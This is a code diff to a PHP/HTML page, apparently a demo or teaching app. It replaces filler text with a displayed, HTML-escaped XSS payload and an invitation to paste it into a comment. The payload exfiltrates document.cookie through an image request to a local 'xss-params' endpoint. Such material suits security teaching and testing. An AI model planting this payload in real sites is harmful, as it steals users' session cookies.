@@ -95,9 +95,13 @@
 
                     <tr>
                         <td>
-                            <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Saepe ullam, et voluptas officiis eius iste, dolorem quisquam repudiandae sequi mollitia molestias! Sunt quidem rerum odit, vel eum consequuntur itaque voluptate?
-                                Dolore, praesentium aspernatur. Voluptates dolorem, iure eius veniam voluptate esse eligendi minima similique at consequatur vel dignissimos corrupti impedit sit odio illo alias debitis quisquam fuga cum! Optio, autem animi.
-                                Nesciunt magni rem similique sed harum fugit! Excepturi blanditiis vitae sapiente expedita accusantium perferendis architecto molestiae, possimus laborum eos impedit accusamus, modi, laboriosam optio eius praesentium dignissimos doloribus commodi deleniti?</p>
+                            <p>
+                                <?php $xss = "<script>document.write('<img src=http://127.0.0.1/xss-params?cookie='         + escape(document.cookie) + '>'); </script>     <script>document.write('<img src=https://www.science.kmitl.ac.th/department_com/department_img/pictureProfile/01.jpg>'); </script>";
+                                    $xss = htmlspecialchars($xss);
+                                    echo "copy these script to comment if you want to make error: <br>";
+                                    echo $xss . "<br>";
+                                ?>
+                            </p>
                         </td>
                     </tr>
 
